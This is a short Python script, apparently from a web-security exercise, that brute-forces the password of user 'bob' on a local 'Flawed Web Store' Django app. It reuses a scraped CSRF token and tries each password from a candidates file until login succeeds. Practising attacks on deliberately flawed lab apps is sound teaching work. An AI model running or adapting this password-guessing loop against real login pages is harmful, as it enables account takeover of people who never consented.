import sys
import requests
import bs4 as bs

def extract_token(response):
	soup = bs.BeautifulSoup(response.text, 'html.parser')
	for i in soup.form.findChildren('input'):
		if i.get('name') == 'csrfmiddlewaretoken':
			return i.get('value')
	return None
	

def isloggedin(response):
	soup = bs.BeautifulSoup(response.text, 'html.parser')
	if (soup.title != None):
		return soup.title.text.startswith('Flawed Web Store')
	return False


def test_password(address, candidates):
	csrf_res = requests.Session().get(address)
	csrf_token = extract_token(csrf_res)
	for password in candidates:
		s = requests.Session()
		r = s.post(address + "/login/?next=/store/", data={"csrfmiddlewaretoken": csrf_token, "username": "bob", "password": password}, headers={"Cookie": "csrftoken=" + csrf_token})
		if (isloggedin(r)):
			return password
	return None

def main(argv):
	address = "http://localhost:8000/store"
	fname = "./candidates.txt"
	candidates = [p.strip() for p in open(fname)]
	print(test_password(address, candidates))

if __name__ == "__main__": 
	main(sys.argv)
